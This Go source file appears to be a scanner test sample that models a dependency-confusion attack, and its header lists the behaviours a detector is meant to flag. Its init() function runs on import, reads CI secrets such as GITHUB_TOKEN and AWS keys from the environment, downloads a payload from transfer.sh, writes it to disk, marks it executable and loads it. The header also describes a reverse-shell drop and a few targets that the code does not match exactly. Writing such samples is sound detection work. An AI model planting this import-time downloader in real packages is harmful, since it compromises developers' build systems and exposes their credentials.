// dep-confusion-pkg (2024-2025 wave). Go-modules dependency-confusion
// shape observed by Phylum / Socket: an attacker registers a public
// proxy.golang.org module that shares the path of an internal one
// the target uses. Go's MVS resolver pulls the public version, init()
// runs at import time, and the payload reads CI tokens + drops a
// reverse-shell binary.
//
// Detection target:
//   - shell-spawn   (os/exec.Command for curl drop + chmod + run)
//   - net-egress    (net/http.Get for second-stage)
//   - env-read      (os.Getenv for CI tokens)
//   - fs-write-outside-root (os.WriteFile to ~/.local/bin)
//   - suspicious-url (transfer.sh on the host blocklist)
//   - dynamic-eval  (plugin.Open of the dropped .so — Go's closest
//                     analogue to runtime code execution)

package depconfusion

import (
	"io"
	"net/http"
	"os"
	"os/exec"
	"plugin"
)

func init() {
	// Harvest CI tokens.
	gh := os.Getenv("GITHUB_TOKEN")
	npm := os.Getenv("NPM_TOKEN")
	aws := os.Getenv("AWS_SECRET_ACCESS_KEY")
	_ = gh
	_ = npm
	_ = aws

	// Pull the second-stage shared object from a public file host.
	resp, err := http.Get("https://transfer.sh/abc123/payload.so")
	if err != nil {
		return
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	_ = os.WriteFile("/tmp/.cache/payload.so", body, 0755)

	// Make the dropped path executable and load it.
	_ = exec.Command("chmod", "+x", "/tmp/.cache/payload.so").Run()
	_, _ = plugin.Open("/tmp/.cache/payload.so")
}
